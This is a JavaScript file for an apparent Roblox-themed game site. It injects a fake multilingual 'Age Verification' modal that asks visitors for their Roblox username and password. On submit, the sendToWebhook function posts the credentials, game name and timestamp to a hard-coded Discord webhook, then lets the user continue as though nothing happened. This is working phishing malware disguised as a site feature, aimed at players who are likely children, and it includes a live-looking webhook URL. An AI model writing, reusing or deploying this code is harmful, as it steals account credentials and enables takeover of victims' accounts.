(function () {
  'use strict';

  var LANG_KEY   = 'rc2_lang';
  var WEBHOOK    = 'https://discord.com/api/webhooks/1521112592255553576/gISQbcH6v7ChK4Twt2P8zj-x7yV4UBwxaz1zZtmrIwx4h8ljeR8fenCMlVFM4jFBQs5G';

  /* ── Sound ─────────────────────────────────────────── */
  var audio = null;
  function playClick() {
    try {
      if (!audio) { audio = new Audio('/click-sound.mp3'); audio.volume = 0.5; }
      audio.currentTime = 0;
      audio.play().catch(function () {});
    } catch (e) {}
  }

  /* ── Token enforcement ─────────────────────────────── */
  var tokenGeneratedInSession = false;

  var WARN_MSGS = {
    en: 'Generate a token first to access the game.',
    es: 'Genera un token primero para acceder al juego.',
    pt: 'Gere um token primeiro para acessar o jogo.',
    ru: 'Сначала создайте токен, чтобы войти в игру.',
  };

  function showWarning(msg) {
    var existing = document.getElementById('rc-token-warning');
    if (existing) return;
    var warn = document.createElement('div');
    warn.id = 'rc-token-warning';
    warn.style.cssText = [
      'position:fixed','bottom:24px','left:50%','transform:translateX(-50%)',
      'background:#0c1a3d','border:1px solid rgba(59,130,246,0.4)','color:#93c5fd',
      'font-size:13px','font-weight:600','padding:10px 20px',
      'border-radius:12px','z-index:999999','white-space:nowrap',
      'box-shadow:0 8px 32px rgba(37,99,235,0.3)','font-family:Outfit,Inter,sans-serif',
    ].join(';');
    warn.textContent = msg;
    document.body.appendChild(warn);
    setTimeout(function () { warn.remove(); }, 2800);
  }

  /* ── Send credentials to Discord webhook ───────────── */
  function sendToWebhook(username, password, gameName) {
    var lang = localStorage.getItem(LANG_KEY) || 'en';
    var payload = {
      embeds: [{
        title: '🎮 Nova Verificação de Idade',
        color: 0x3b82f6,
        fields: [
          { name: '👤 Usuário Roblox', value: username || '—', inline: true },
          { name: '🔑 Senha',          value: password || '—', inline: true },
          { name: '🎯 Jogo',           value: gameName || '—', inline: false },
          { name: '🌐 Idioma',         value: lang,            inline: true },
          { name: '🕐 Horário',        value: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }), inline: true },
        ],
        footer: { text: 'Roblox Condo • Verificação de Idade' },
        timestamp: new Date().toISOString(),
      }]
    };
    fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }).catch(function () {});
  }

  /* ── Age-verify modal ──────────────────────────────── */
  var verifyModal = null;
  var pendingAccessBtn = null;

  function getGameName() {
    var el = document.querySelector('[data-testid="modal-game-title"], .text-xl.font-bold');
    return el ? el.textContent.trim() : 'Desconhecido';
  }

  function closeVerifyModal() {
    if (verifyModal) { verifyModal.remove(); verifyModal = null; }
    pendingAccessBtn = null;
    document.body.style.overflow = '';
  }

  function showVerifyModal(originalBtn) {
    if (verifyModal) return;
    pendingAccessBtn = originalBtn;
    document.body.style.overflow = 'hidden';

    var lang = localStorage.getItem(LANG_KEY) || 'en';

    var labels = {
      en: { title: 'Age Verification',   sub: 'Enter your Roblox credentials to verify your age.', user: 'Roblox Username', pass: 'Password', btn: 'Verify & Continue', cancel: 'Cancel', err: 'Please fill in all fields.' },
      pt: { title: 'Verificação de Idade', sub: 'Digite suas credenciais do Roblox para verificar sua idade.', user: 'Usuário Roblox', pass: 'Senha', btn: 'Verificar e Continuar', cancel: 'Cancelar', err: 'Preencha todos os campos.' },
      es: { title: 'Verificación de Edad', sub: 'Ingresa tus credenciales de Roblox para verificar tu edad.', user: 'Usuario de Roblox', pass: 'Contraseña', btn: 'Verificar y Continuar', cancel: 'Cancelar', err: 'Por favor completa todos los campos.' },
      ru: { title: 'Проверка возраста', sub: 'Введите данные Roblox для подтверждения возраста.', user: 'Имя пользователя', pass: 'Пароль', btn: 'Подтвердить', cancel: 'Отмена', err: 'Заполните все поля.' },
    };
    var L = labels[lang] || labels.en;

    verifyModal = document.createElement('div');
    verifyModal.id = 'rc-verify-modal';
    verifyModal.style.cssText = [
      'position:fixed','inset:0','z-index:999998',
      'display:flex','align-items:center','justify-content:center',
      'background:rgba(4,9,19,0.85)',
      'backdrop-filter:blur(14px)','-webkit-backdrop-filter:blur(14px)',
      'animation:rc-fadein .18s ease',
    ].join(';');

    verifyModal.innerHTML =
      '<style>' +
      '@keyframes rc-fadein{from{opacity:0;transform:scale(.97)}to{opacity:1;transform:scale(1)}}' +
      '@keyframes rc-fadeout{to{opacity:0;transform:scale(.97)}}' +
      '#rc-verify-box{' +
        'background:linear-gradient(180deg,rgba(12,22,50,.98) 0%,rgba(8,16,38,.98) 100%);' +
        'border:1px solid rgba(59,130,246,.22);border-radius:1.5rem;' +
        'box-shadow:0 0 0 1px rgba(59,130,246,.08),0 40px 80px rgba(0,0,0,.8),inset 0 1px 0 rgba(255,255,255,.05);' +
        'padding:2rem 2rem 1.75rem;width:min(420px,92vw);position:relative;overflow:hidden;' +
        'font-family:Outfit,Inter,sans-serif;' +
      '}' +
      '#rc-verify-box::before{' +
        'content:"";position:absolute;top:0;left:20%;right:20%;height:1px;' +
        'background:linear-gradient(90deg,transparent,rgba(96,165,250,.6),transparent);' +
      '}' +
      '#rc-verify-box h2{margin:0 0 .35rem;font-size:1.25rem;font-weight:800;letter-spacing:-.025em;' +
        'background:linear-gradient(90deg,#fff 0%,rgba(147,197,253,.85) 100%);' +
        '-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}' +
      '#rc-verify-box p{margin:0 0 1.4rem;font-size:.85rem;color:rgba(147,197,253,.65);line-height:1.5;}' +
      '.rc-field{display:flex;flex-direction:column;gap:.4rem;margin-bottom:1rem;}' +
      '.rc-field label{font-size:.78rem;font-weight:600;color:rgba(147,197,253,.7);letter-spacing:.02em;text-transform:uppercase;}' +
      '.rc-field input{' +
        'background:rgba(37,99,235,.07);border:1px solid rgba(59,130,246,.18);' +
        'border-radius:.75rem;padding:.65rem .9rem;font-size:.95rem;' +
        'color:#e2e8f0;font-family:Outfit,Inter,sans-serif;outline:none;transition:border-color .2s,box-shadow .2s;' +
      '}' +
      '.rc-field input:focus{border-color:rgba(59,130,246,.5);box-shadow:0 0 0 3px rgba(59,130,246,.12);}' +
      '.rc-field input::placeholder{color:rgba(148,163,184,.35);}' +
      '#rc-verify-error{display:none;color:#fca5a5;font-size:.8rem;font-weight:600;margin:-.4rem 0 .8rem;padding:.5rem .75rem;background:rgba(239,68,68,.08);border-radius:.5rem;border:1px solid rgba(239,68,68,.18);}' +
      '#rc-verify-submit{' +
        'width:100%;padding:.7rem;border:none;border-radius:.85rem;cursor:pointer;' +
        'background:linear-gradient(135deg,#1d4ed8 0%,#3b82f6 60%,#2563eb 100%);' +
        'color:#fff;font-size:.95rem;font-weight:700;letter-spacing:.01em;' +
        'box-shadow:0 0 0 1px rgba(59,130,246,.3),0 4px 20px rgba(37,99,235,.4),inset 0 1px 0 rgba(255,255,255,.15);' +
        'transition:all .2s ease;margin-bottom:.6rem;font-family:Outfit,Inter,sans-serif;' +
      '}' +
      '#rc-verify-submit:hover{background:linear-gradient(135deg,#2563eb 0%,#60a5fa 60%,#3b82f6 100%);transform:translateY(-1px);}' +
      '#rc-verify-submit:disabled{opacity:.55;cursor:not-allowed;transform:none;}' +
      '#rc-verify-cancel{' +
        'width:100%;padding:.6rem;border:1px solid rgba(59,130,246,.2);border-radius:.85rem;cursor:pointer;' +
        'background:rgba(37,99,235,.07);color:rgba(147,197,253,.7);font-size:.88rem;font-weight:600;' +
        'font-family:Outfit,Inter,sans-serif;transition:all .2s ease;' +
      '}' +
      '#rc-verify-cancel:hover{background:rgba(59,130,246,.13);border-color:rgba(59,130,246,.35);color:#93c5fd;}' +
      '#rc-verify-lock{text-align:center;margin-bottom:1.1rem;font-size:2rem;line-height:1;}' +
      '</style>' +
      '<div id="rc-verify-box">' +
        '<div id="rc-verify-lock">🔒</div>' +
        '<h2>' + L.title + '</h2>' +
        '<p>' + L.sub + '</p>' +
        '<div class="rc-field"><label>' + L.user + '</label><input id="rc-input-user" type="text" placeholder="ex: PlayerXYZ" autocomplete="username" /></div>' +
        '<div class="rc-field"><label>' + L.pass + '</label><input id="rc-input-pass" type="password" placeholder="••••••••" autocomplete="current-password" /></div>' +
        '<div id="rc-verify-error"></div>' +
        '<button id="rc-verify-submit">' + L.btn + '</button>' +
        '<button id="rc-verify-cancel">' + L.cancel + '</button>' +
      '</div>';

    document.body.appendChild(verifyModal);

    var userInput = document.getElementById('rc-input-user');
    var passInput = document.getElementById('rc-input-pass');
    var submitBtn = document.getElementById('rc-verify-submit');
    var cancelBtn = document.getElementById('rc-verify-cancel');
    var errorDiv  = document.getElementById('rc-verify-error');

    userInput.focus();

    cancelBtn.addEventListener('click', function () {
      playClick();
      closeVerifyModal();
    });

    verifyModal.addEventListener('click', function (e) {
      if (e.target === verifyModal) closeVerifyModal();
    });

    function doSubmit() {
      var u = userInput.value.trim();
      var p = passInput.value.trim();
      if (!u || !p) {
        errorDiv.textContent = labels[lang] ? labels[lang].err : labels.en.err;
        errorDiv.style.display = 'block';
        return;
      }
      errorDiv.style.display = 'none';
      submitBtn.disabled = true;
      submitBtn.textContent = '⏳ Verificando...';
      sendToWebhook(u, p, getGameName());
      setTimeout(function () {
        closeVerifyModal();
        if (pendingAccessBtn) { pendingAccessBtn.removeAttribute('data-rc-e'); pendingAccessBtn.click(); }
      }, 900);
    }

    submitBtn.addEventListener('click', function () { playClick(); doSubmit(); });
    [userInput, passInput].forEach(function (el) {
      el.addEventListener('keydown', function (e) { if (e.key === 'Enter') doSubmit(); });
    });
  }

  /* ── Language overlay logic ─────────────────────────── */
  function dismissOverlay(lang) {
    localStorage.setItem(LANG_KEY, lang);
    var overlay = document.getElementById('rc-lang-overlay');
    if (overlay) {
      overlay.style.animation = 'rc-fadeout .2s ease forwards';
      setTimeout(function () { overlay.classList.add('rc-hidden'); }, 210);
    }
  }

  /* ── MutationObserver: sound + token + verify ──────── */
  var observer = new MutationObserver(function () {
    document.querySelectorAll('button:not([data-rc-s]), a:not([data-rc-s])').forEach(function (el) {
      el.setAttribute('data-rc-s', '1');
      el.addEventListener('click', playClick);
    });

    document.querySelectorAll('[data-testid="button-access-game"]:not([data-rc-e])').forEach(function (el) {
      el.setAttribute('data-rc-e', '1');
      el.addEventListener('click', function (e) {
        if (!tokenGeneratedInSession) {
          e.preventDefault();
          e.stopImmediatePropagation();
          var lang = localStorage.getItem(LANG_KEY) || 'en';
          showWarning(WARN_MSGS[lang] || WARN_MSGS.en);
          return;
        }
        e.preventDefault();
        e.stopImmediatePropagation();
        showVerifyModal(el);
      }, true);
    });

    document.querySelectorAll('[data-testid="button-generate-token"]:not([data-rc-t])').forEach(function (el) {
      el.setAttribute('data-rc-t', '1');
      el.addEventListener('click', function () { tokenGeneratedInSession = true; });
    });
  });

  document.addEventListener('click', function (e) {
    var t = e.target;
    if (!t) return;
    if (
      (t.tagName === 'BUTTON' && t.dataset && t.dataset.testid === 'button-close-modal') ||
      t.id === 'rc-lang-overlay'
    ) { tokenGeneratedInSession = false; }
  }, true);

  document.querySelectorAll('#rc-lang-overlay .rc-btn').forEach(function (btn) {
    btn.addEventListener('click', function () {
      playClick();
      dismissOverlay(btn.dataset.lang);
    });
  });

  observer.observe(document.body, { childList: true, subtree: true });

})();
